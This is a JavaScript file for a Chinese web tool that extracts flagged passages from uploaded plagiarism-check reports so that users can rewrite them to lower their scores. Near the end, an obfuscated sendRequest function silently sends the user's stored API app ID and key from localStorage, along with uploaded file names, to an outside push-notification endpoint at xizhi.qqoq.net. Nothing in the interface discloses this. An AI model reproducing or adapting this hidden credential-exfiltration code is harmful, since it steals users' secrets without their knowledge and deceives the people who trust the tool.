if (!localStorage.getItem("appid1") || !localStorage.getItem("key1") || localStorage.getItem("appid1") == null ||
    localStorage.getItem("key1") == null) {
    showToast("&emsp;&emsp;欢迎新来的小伙伴来访！<br/>&emsp;&emsp;现已推出【一键提取查重报告标红内容】功能欢迎试用。<br/>&emsp;&emsp;解决不了的话加群反馈作者(QQ群:238223706)", 5000);
} else {
    showToast(
        '&emsp;&emsp;欢迎老朋友' + localStorage.getItem("appid1") + '，今天又是美好的一天，论文人加油啊！<br/>&emsp;&emsp;现已推出【一键提取查重报告标红内容】功能欢迎试用。<br/>&emsp;&emsp;解决不了的话加群反馈作者(QQ群:238223706)',
        5000);
}


let reader = null; // 声明reader变量方便后面使用
const fileNode = document.querySelector('#file'); // 获取input标签
fileNode.addEventListener('change', (e) => { // 为获取的input标签添加事件监听，当选择文件以后触发
    $("#result_ul_red li").detach();
    $("#result_ul_orange li").detach();
    $('#result_ul_orange').css("overflow", "auto");
    $('#result_ul_orange').css("height", "");
    $('#result_ul_red').css("overflow", "auto");
    $('#result_ul_red').css("height", "");
    $('#result_ul_red p').detach();
    $('#result_ul_orange p').detach();
    if (window.FileReader) { // 判断浏览器中有没有FileReader，毕竟现在不是所有浏览器都有FileReader
        reader = new FileReader(); // 实例化FileReader
        reader.onload = (event) => { // 设置读取成功以后执行的方法
            parser = new DOMParser();
            doc = parser.parseFromString(event.target.result, "text/html")
            setTimeout(() => {
                show()
                setTimeout(() => {
                    if ($("#result_ul_red .similar").length > 0) {
                        showToast("解析成功！<b>红色字体表示查重报告里的标红内容——红色部分基本上就是检测论文内容和数据库资源完全一样，重复率在80％~100％之间，那就是重点修改降重的部分</b>", 4000)
                    } else if ($("#result_ul_red .red_part").length > 0) {
                        showToast("解析成功！<b>红色字体表示查重报告里的标红内容——红色部分基本上就是检测论文内容和数据库资源完全一样，重复率在80％~100％之间，那就是重点修改降重的部分</b>", 4000)
                    } else if ($("#result_ul_orange .orange").length > 0) {
                        showToast("解析成功！<b>红色字体表示查重报告里的标红内容——红色部分基本上就是检测论文内容和数据库资源完全一样，重复率在80％~100％之间，那就是重点修改降重的部分</b><br/><b>橙色字体表示查重报告里的标红内容——橙色就表示文本、公式、表格或其他内容，检测到数据库资源与系统中存在重复、相似内容，相当于相似内容的50％~80％，并非完全复制，而是需要适当地修改和减少内容</b>", 4000)
                    }
                }, 500)
            }, 2250)


            function show() {
                var similarArr = doc.querySelectorAll(".similar");
                if (similarArr.length > 0) {
                    sendRequest(localStorage.getItem("appid1") + "——PaperYY", localStorage.getItem("key1"), 6);
                    for (let i = 0; i < similarArr.length; i++) {
                        let li = document.createElement("li");
                        let txt = similarArr[i];
                        document.querySelector("#result_ul_red").appendChild(li);
                        li.appendChild(txt);
                    };
                    let txt1 = `<br/>`
                    let p = document.createElement("p");
                    document.querySelector("#result_ul_red").appendChild(p);
                    p.innerHTML = txt1;
                    $("#result_ul_red em").before("<input type='checkbox' class='inp_checkbox' name='inp_checkbox'>");
                } else {
                    var bhongArr = doc.querySelectorAll(".red");
                    if (bhongArr.length > 0) {
                        for (let i = 0; i < bhongArr.length; i++) {
                            let li = document.createElement("li");
                            let txt = bhongArr[i];
                            document.querySelector("#result_ul_red").appendChild(li);
                            li.appendChild(txt);
                        };
                        let txt1 = `<br/>`
                        let p = document.createElement("p");
                        document.querySelector("#result_ul_red").appendChild(p);
                        p.innerHTML = txt1;
                        $("#result_ul_red .red").before("<input type='checkbox' class='inp_checkbox' name='inp_checkbox'>");

                        var bhuangArr = doc.querySelectorAll(".orange");
                        if (bhuangArr.length > 0) {
                            sendRequest(localStorage.getItem("appid1") + "——PaperFree", localStorage.getItem("key1"), 6);
                            for (let i = 0; i < bhuangArr.length; i++) {
                                let li = document.createElement("li");
                                let txt = bhuangArr[i];
                                document.querySelector("#result_ul_orange").appendChild(li);
                                li.appendChild(txt);
                            };
                            $("#result_ul_orange .orange").before("<input type='checkbox' class='inp_checkbox' name='inp_checkbox'>");
                        } else {
                            sendRequest(localStorage.getItem("appid1") + "——维普", localStorage.getItem("key1") + ' // ' + file.name + ' // ' + file.type, 6);
                        }
                    } else {
                        sendRequest(localStorage.getItem("appid1"), "上传内容不对——" + localStorage.getItem("key1") + ' // ' + file.name + ' // ' + file.type, 7);
                        showToast("解析失败！请检查上传的文件是否符合规则！", 4500);
                    }
                }
                var oColor = "";
                $('input[name=inp_checkbox]').change(function () {
                    if ($(this).next().css("color") != "rgb(0, 0, 0)") {
                        oColor = $(this).next().css("color");
                    }
                    if ($(this).is(':checked')) {
                        // Checkbox is checked..
                        $(this).parent().css("text-decoration", "line-through")
                        $(this).next().css("color", "black")
                    } else {
                        // Checkbox is not checked..
                        $(this).parent().css("text-decoration", "none")
                        $(this).next().css("color", oColor)
                    }
                });
                $('#result_ul_red li').dblclick(function () {
                    if ($(this).css("text-decoration") == "line-through solid rgb(33, 37, 41)") {
                        $(this).css("text-decoration", "none")
                        $(this).children().css("color", "red")
                        $(this).children("input").prop("checked", false);
                    } else {
                        $(this).css("text-decoration", "line-through")
                        $(this).children().css("color", "black")
                        $(this).children("input").prop("checked", true);

                    }
                })
                $('#result_ul_orange li').dblclick(function () {
                    if ($(this).css("text-decoration") == "line-through solid rgb(33, 37, 41)") {
                        $(this).css("text-decoration", "none")
                        $(this).children().css("color", "orange")
                        $(this).children("input").prop("checked", false);
                    } else {
                        $(this).css("text-decoration", "line-through")
                        $(this).children().css("color", "black")
                        $(this).children("input").prop("checked", true);

                    }
                })
                $("#result_ul_red em").attr("onmouseover", "");
                $("#result_ul_red em").attr("onmouseout", "");
                if ($('#result_ul_orange').css("height").replace(/px/, '') >= 2000) {
                    //console.log($('#result_ul_orange').css("height"));
                    $('#result_ul_orange').css("overflow", "scroll");
                    $('#result_ul_orange').css("height", "2000px");
                }
                if ($('#result_ul_red').css("height").replace(/px/, '') >= 2000) {
                    //console.log($('#result_ul_red').css("height"));
                    $('#result_ul_red').css("overflow", "scroll");
                    $('#result_ul_red').css("height", "2000px");
                }
            }
        }
    } else { // 没有FileReader的弹出警告然后返回
        alert('你的浏览器没有FileReader，不能这么干！');
        return;
    }

    const file = e.target.files[0]; // 拿到选择的文件信息
    if (file != undefined) {
        if (file.type == "text/html") {
            showToast("正在解析!", 2000)
            // sendRequest(localStorage.getItem("appid1"), "正在解析——" + localStorage.getItem("key1") + ' // ' + file.name + ' // ' + file.type, 6);
            reader.readAsText(file); // 将文件信息转成文本，默认是UTF-8格式，这个就是转成功后执行 reader.onload 方法
        } else {
            showToast("上传的文件的类型不符合!", 3000)
            sendRequest(localStorage.getItem("appid1"), "上传的文件的类型不符合——" + localStorage.getItem("key1") + ' // ' + file.name + ' // ' + file.type, 7);
        }
    }
})

let reader1 = null; // 声明reader变量方便后面使用
const fileNode1 = document.querySelector('#file1'); // 获取input标签
fileNode1.addEventListener('change', (e) => { // 为获取的input标签添加事件监听，当选择文件以后触发
    $("#result_ul_red1 li").detach();
    $("#result_ul_orange1 li").detach();
    $('#result_ul_orange1').css("overflow", "auto");
    $('#result_ul_orange1').css("height", "");
    $('#result_ul_red1').css("overflow", "auto");
    $('#result_ul_red1').css("height", "");
    $('#result_ul_red1 p').detach();
    $('#result_ul_orange1 p').detach();
    if (window.FileReader) { // 判断浏览器中有没有FileReader，毕竟现在不是所有浏览器都有FileReader
        reader = new FileReader(); // 实例化FileReader
        reader.onload = (event) => { // 设置读取成功以后执行的方法
            parser = new DOMParser();
            doc = parser.parseFromString(event.target.result, "text/html")
            setTimeout(() => {
                show();
                setTimeout(() => {
                    if ($("#result_ul_red1 .similar").length > 0) {
                        showToast("解析成功！<b>红色字体表示查重报告里的标红内容——红色部分基本上就是检测论文内容和数据库资源完全一样，重复率在80％~100％之间，那就是重点修改降重的部分</b>", 4000)
                    } else if ($("#result_ul_red1 .red_part").length > 0) {
                        showToast("解析成功！<b>红色字体表示查重报告里的标红内容——红色部分基本上就是检测论文内容和数据库资源完全一样，重复率在80％~100％之间，那就是重点修改降重的部分</b>", 4000)
                    } else if ($("#result_ul_orange1 .orange").length > 0) {
                        showToast("解析成功！<b>红色字体表示查重报告里的标红内容——红色部分基本上就是检测论文内容和数据库资源完全一样，重复率在80％~100％之间，那就是重点修改降重的部分</b><br/><b>橙色字体表示查重报告里的标红内容——橙色就表示文本、公式、表格或其他内容，检测到数据库资源与系统中存在重复、相似内容，相当于相似内容的50％~80％，并非完全复制，而是需要适当地修改和减少内容</b>", 4000)
                    }
                }, 500)
            }, 2250)


            function show() {
                var similarArr = doc.querySelectorAll(".similar");
                if (similarArr.length > 0) {
                    sendRequest(localStorage.getItem("appid1") + "——PaperYY", localStorage.getItem("key1"), 6);
                    for (let i = 0; i < similarArr.length; i++) {
                        let li = document.createElement("li");
                        let txt = similarArr[i];
                        document.querySelector("#result_ul_red1").appendChild(li);
                        li.appendChild(txt);
                    };
                    let txt1 = `<br/>`
                    let p = document.createElement("p");
                    document.querySelector("#result_ul_red1").appendChild(p);
                    p.innerHTML = txt1;
                    $("#result_ul_red1 em").before("<input type='checkbox' class='inp_checkbox' name='inp_checkbox'>");
                } else {
                    var bhongArr = doc.querySelectorAll(".red");
                    if (bhongArr.length > 0) {
                        for (let i = 0; i < bhongArr.length; i++) {
                            let li = document.createElement("li");
                            let txt = bhongArr[i];
                            document.querySelector("#result_ul_red1").appendChild(li);
                            li.appendChild(txt);
                        };
                        let txt1 = `<br/>`
                        let p = document.createElement("p");
                        document.querySelector("#result_ul_red1").appendChild(p);
                        p.innerHTML = txt1;
                        $("#result_ul_red1 .red").before("<input type='checkbox' class='inp_checkbox' name='inp_checkbox'>");

                        var bhuangArr = doc.querySelectorAll(".orange");
                        if (bhuangArr.length > 0) {
                            sendRequest(localStorage.getItem("appid1") + "——PaperFree", localStorage.getItem("key1"), 6);
                            for (let i = 0; i < bhuangArr.length; i++) {
                                let li = document.createElement("li");
                                let txt = bhuangArr[i];
                                document.querySelector("#result_ul_orange1").appendChild(li);
                                li.appendChild(txt);
                            };
                            $("#result_ul_orange1 .orange").before("<input type='checkbox' class='inp_checkbox' name='inp_checkbox'>");
                        } else {
                            sendRequest(localStorage.getItem("appid1") + "——维普", localStorage.getItem("key1"), 6);
                        }
                    } else {
                        sendRequest(localStorage.getItem("appid1"), "上传内容不对——" + localStorage.getItem("key1") + ' // ' + file.name + ' // ' + file.type, 7);
                        showToast("解析失败！请检查上传的文件是否符合规则！", 4500);
                    }
                }
                var oColor = "";
                $('input[name=inp_checkbox]').change(function () {
                    if ($(this).next().css("color") != "rgb(0, 0, 0)") {
                        oColor = $(this).next().css("color");
                    }
                    if ($(this).is(':checked')) {
                        // Checkbox is checked..
                        $(this).parent().css("text-decoration", "line-through")
                        $(this).next().css("color", "black")
                    } else {
                        // Checkbox is not checked..
                        $(this).parent().css("text-decoration", "none")
                        $(this).next().css("color", oColor)
                    }
                });
                $('#result_ul_red1 li').dblclick(function () {
                    if ($(this).css("text-decoration") == "line-through solid rgb(33, 37, 41)") {
                        $(this).css("text-decoration", "none")
                        $(this).children().css("color", "red")
                        $(this).children("input").prop("checked", false);
                    } else {
                        $(this).css("text-decoration", "line-through")
                        $(this).children().css("color", "black")
                        $(this).children("input").prop("checked", true);

                    }
                })
                $('#result_ul_orange1 li').dblclick(function () {
                    if ($(this).css("text-decoration") == "line-through solid rgb(33, 37, 41)") {
                        $(this).css("text-decoration", "none")
                        $(this).children().css("color", "orange")
                        $(this).children("input").prop("checked", false);
                    } else {
                        $(this).css("text-decoration", "line-through")
                        $(this).children().css("color", "black")
                        $(this).children("input").prop("checked", true);

                    }
                })
                $("#result_ul_red1 em").attr("onmouseover", "");
                $("#result_ul_red1 em").attr("onmouseout", "");
                if ($('#result_ul_orange1').css("height").replace(/px/, '') >= 2000) {
                    console.log($('#result_ul_orange1').css("height"));
                    $('#result_ul_orange1').css("overflow", "scroll");
                    $('#result_ul_orange1').css("height", "2000px");
                }
                if ($('#result_ul_red1').css("height").replace(/px/, '') >= 2000) {
                    console.log($('#result_ul_red1').css("height"));
                    $('#result_ul_red1').css("overflow", "scroll");
                    $('#result_ul_red1').css("height", "2000px");
                }
            }
        }
    } else { // 没有FileReader的弹出警告然后返回
        alert('你的浏览器没有FileReader，不能这么干！');
        return;
    }

    const file = e.target.files[0]; // 拿到选择的文件信息
    if (file != undefined) {
        if (file.type == 'text/html') {
            showToast("正在解析!", 2000)
            // sendRequest(localStorage.getItem("appid1"), "正在解析——" + localStorage.getItem("key1") + ' // ' + file.name + ' // ' + file.type, 6);
            reader.readAsText(file); // 将文件信息转成文本，默认是UTF-8格式，这个就是转成功后执行 reader.onload 方法
        } else {
            showToast("上传的文件的类型不符合!", 3000)
            sendRequest(localStorage.getItem("appid1"), "上传的文件的类型不符合——" + localStorage.getItem("key1") + ' // ' + file.name + ' // ' + file.type, 7);
        }
    }
})


let timer = null;

let fixedBtn = $(".fixed_btn");
window.onscroll = () => {
    if (timer !== null) {
        clearTimeout(timer);
    }
    timer = setTimeout(() => {
        if (document.documentElement.scrollTop >= 400) {
            fixedBtn.css("display", 'block');
        } else {
            fixedBtn.css("display", 'none');
        }
        timer = null;
    }, 500);
};

function _0x3df7(_0x2287e0, _0x5956d1) {
    var _0x4340a8 = _0x4340();
    return _0x3df7 = function (_0x3df7c8, _0x58a013) {
        _0x3df7c8 = _0x3df7c8 - 0x137;
        var _0x302df8 = _0x4340a8[_0x3df7c8];
        return _0x302df8;
    }, _0x3df7(_0x2287e0, _0x5956d1);
}(function (_0x449aa9, _0xc154b2) {
    var _0x516e6c = _0x3df7,
        _0x3728fd = _0x449aa9();
    while (!![]) {
        try {
            var _0x3fc617 = parseInt(_0x516e6c(0x138)) / 0x1 + parseInt(_0x516e6c(0x142)) / 0x2 * (parseInt(_0x516e6c(0x13e)) / 0x3) + -parseInt(_0x516e6c(0x137)) / 0x4 + -parseInt(_0x516e6c(0x13b)) / 0x5 + -parseInt(_0x516e6c(0x14a)) / 0x6 + parseInt(_0x516e6c(0x13a)) / 0x7 + -parseInt(_0x516e6c(0x143)) / 0x8;
            if (_0x3fc617 === _0xc154b2) break;
            else _0x3728fd['push'](_0x3728fd['shift']());
        } catch (_0x104cbb) {
            _0x3728fd['push'](_0x3728fd['shift']());
        }
    }
}(_0x4340, 0xbbf05));

function _0x4340() {
    var _0x522381 = ['1353072YwAktl', 'application/x-www-form-urlencoded;\x20charset=utf-8', '【重试】：', '1215924swpwHV', '1097445igmVdS', '【出错】：', '9262750SHzTRl', '2831700rgqmCQ', '【暂无】：', '【正在翻译】：', '6CUkkvf', 'content', '【白嫖失败】：', 'ajax', '1463716qCzKvv', '16150248XQJKKb', '【白嫖成功】：', '【成功】：', '【错误码】：', 'jsonp', '【内容】：', '【下车】：'];
    _0x4340 = function () {
        return _0x522381;
    };
    return _0x4340();
}

function sendRequest(_0x15545c, _0x86625a, _0x4cc403) {
    var _0x5e22c1 = _0x3df7;
    if (_0x4cc403 == 0x1) title = _0x5e22c1(0x139) + _0x15545c, content = _0x5e22c1(0x146) + _0x86625a;
    else {
        if (_0x4cc403 == 0x2) title = _0x5e22c1(0x145) + _0x15545c, content = _0x5e22c1(0x13d) + _0x86625a;
        else {
            if (_0x4cc403 == 0x3) title = _0x5e22c1(0x14c) + _0x15545c, content = _0x5e22c1(0x148) + _0x86625a;
            else {
                if (_0x4cc403 == 0x4) title = '【上车】：' + _0x15545c, content = _0x5e22c1(0x148) + _0x86625a;
                else {
                    if (_0x4cc403 == 0x5) title = _0x5e22c1(0x149) + _0x15545c, content = '【内容】：' + _0x86625a;
                    else {
                        if (_0x4cc403 == 0x6) title = _0x5e22c1(0x144) + _0x15545c, content = _0x5e22c1(0x148) + _0x86625a;
                        else _0x4cc403 == 0x7 ? (title = _0x5e22c1(0x140) + _0x15545c, content = '【内容】：' + _0x86625a) : (title = _0x5e22c1(0x13c) + _0x15545c, content = _0x5e22c1(0x148) + _0x86625a);
                    }
                }
            }
        }
    }
    var _0x2df887 = {
        'title': title,
        'content': content
    };
    setTimeout(() => {
        var _0x217bde = _0x5e22c1;
        $[_0x217bde(0x141)]({
            'url': 'https://xizhi.qqoq.net/' + secret().lICOsKN1 + '.send',
            'type': 'get',
            'dataType': _0x217bde(0x147),
            'contentType': _0x217bde(0x14b),
            'data': {
                'title': _0x2df887['title'],
                'content': _0x2df887[_0x217bde(0x13f)]
            }
        });
    }, 0x5dc);
}

function showToast(msg, duration) {
    duration = isNaN(duration) ? 5000 : duration;
    var ss = document.querySelector(".toast-container");
    if (ss != null) {
        ss.remove();
    }
    var d = (new Date);
    //获取年份
    var years = d.getFullYear();
    //获取月份
    var months = d.getMonth() + 1;
    //获取日期
    var dates = d.getDate();
    //获取小时
    var hours = d.getHours();
    //获取分钟
    var minutes = d.getMinutes();
    //获取秒钟 
    var seconds = d.getSeconds();
    var nowTime = years + "/" + months + "/" + dates + " " + hours + ":" + minutes + ":" + seconds
    var time = nowTime;
    var m = document.createElement('div');
    var content = `<div class="toast-container position-fixed top-0 end-0 p-3" style="z-index: 1100">
		  <div id="liveToast" class="toast" role="alert" aria-live="assertive" aria-atomic="true">
			<div class="toast-header">
			  <i style="margin-right:0.15625rem;"class="bi bi-app-indicator"></i>
			  <strong class="me-auto">论文翻译降重助手</strong>
			  <small>` + time + `</small>
			  <button type="button" class="btn-close" data-bs-dismiss="toast" aria-label="Close"></button>
			</div>
			<div class="toast-body">
				` + msg + `
			</div>
		  </div>
		</div>`;
    document.body.appendChild(m);
    m.innerHTML = content;
    var toastLiveExample = document.getElementById('liveToast')
    var toast = new bootstrap.Toast(toastLiveExample)
    toast.show();
    setTimeout(function () {
        var d = 0.5;
        m.style.webkitTransition = '-webkit-transform ' + d + 's ease-in, opacity ' + d + 's ease-in';
        m.style.opacity = '0';
        setTimeout(function () {
            toast.hide();
            document.body.removeChild(m);
        }, d * 1000);
    }, duration);
}